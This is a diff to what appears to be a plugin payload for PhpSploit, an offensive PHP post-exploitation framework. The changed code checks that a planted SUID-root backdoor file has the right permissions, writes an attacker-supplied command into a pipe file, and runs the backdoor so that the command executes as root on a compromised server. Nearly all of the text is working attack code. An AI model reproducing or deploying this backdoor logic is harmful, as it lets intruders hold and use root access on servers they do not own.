@@ -3,24 +3,24 @@
 !import(execute)
 !import(getPerms)
 
-// check permissions for backdoor file
-if (getPerms($PHPSPLOIT['BACKDOOR']) != '-rwsrwxrwx')
-    return error("%s: Invalid backdoor: Bad file name or permissions",
-                 $PHPSPLOIT['BACKDOOR']);
+// check SUIDROOT_BACKDOOR permissions
+if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 3, 1) != 's')
+    return error("%s (SUIDROOT_BACKDOOR): SUID bit is not set",
+        $PHPSPLOIT['BACKDOOR']);
+if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 9, 1) != 'x')
+    return error("%s (SUIDROOT_BACKDOOR): Not executable",
+        $PHPSPLOIT['BACKDOOR']);
 
-// try to open pipe file for writting
-if (($file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
-    return error("%s: Could not write to backdoor pipe file",
-                 $PHPSPLOIT['PIPE']);
+// write command to SUIDROOT_PIPE file
+if (($pipe_file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
+    return error("%s (SUIDROOT_PIPE): Not writeable",
+        $PHPSPLOIT['PIPE']);
+fwrite($pipe_file, $PHPSPLOIT['COMMAND']);
+fclose($pipe_file);
 
-// write command to the pipe file
-fwrite($file, $PHPSPLOIT['COMMAND']);
-fclose($file);
-chmod($PHPSPLOIT['PIPE'], 0777);
-
-// execute the backdoor (which himself executes pipe file's contents
-$result = @execute($PHPSPLOIT['BACKDOOR']);
-unlink($PHPSPLOIT['PIPE']);
+// execute SUIDROOT_BACKDOOR
+$result = execute($PHPSPLOIT['BACKDOOR']);
+file_put_contents($PHPSPLOIT['PIPE'], "");
 return $result;
 
 ?>
